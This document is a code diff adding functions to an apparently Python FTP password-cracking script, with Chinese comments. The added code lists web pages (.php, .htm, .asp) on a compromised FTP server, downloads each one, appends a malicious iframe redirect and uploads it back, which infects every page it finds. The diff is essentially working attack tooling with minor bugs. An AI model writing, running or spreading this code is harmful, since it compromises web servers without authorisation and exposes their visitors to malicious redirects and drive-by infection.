@@ -40,6 +40,42 @@ def vlcLogin(hostname, pwdFile):                #参数(主机名，字典文件
     print('\n[-] Cannot crack the FTP password, please change the password dictionary try again!')
     return (None,None)
 
+#如果密码破解成功，则搜索FTP服务器上的网页：
+def returnDefalut(ftp):
+    try:
+        drilist = ftp.nlst()
+    except:
+        dirlist = []
+        print("[-] Could not list directory contents.")
+        print("[-] Skipping To Next Target.")
+        return
+    retList = []
+    for fileName in drilist:
+        fn = fileName.lower()
+        if '.php' in fn or '.htm' in fn or '.asp' in fn:
+            print('[+] Found default page: '+ fileName)
+            retList.append(fileName)
+    return retList
+#注入恶意代码到搜索到的网页 
+#
+#
+def injectPage(ftp,page,redirect):
+    f = open(page +'.tmp','w')
+    ftp.retrlines('RETR ' + page, f.write)
+    print('[+] Downloaded Page: ' + page)
+    f.write(redirect)
+    f.close()
+    print('[+] Injected Malicious IFrame on: '+ page)
+    ftp.storlines('STOR ' + page,open(page + '.tmp'))
+    print('[+] Uploaded Injected Page: ' + page)
+#在破解出FTP用户名、密码后，攻击过程：搜索服务器上的网页并向其中注入恶意代码：   
+def attack(username,password,tgtHost,redirect):
+    ftp = ftplib.FTP(tgtHost)
+    ftp.login(username,password)
+    defPages = returnDefalut(ftp)
+    for defPage in defPages:
+        injectPage(ftp,defPage,redirect)
+        
 def main():
     # 这里用描述创建了ArgumentParser对象
     parser = argparse.ArgumentParser(description='FTP Scanner')
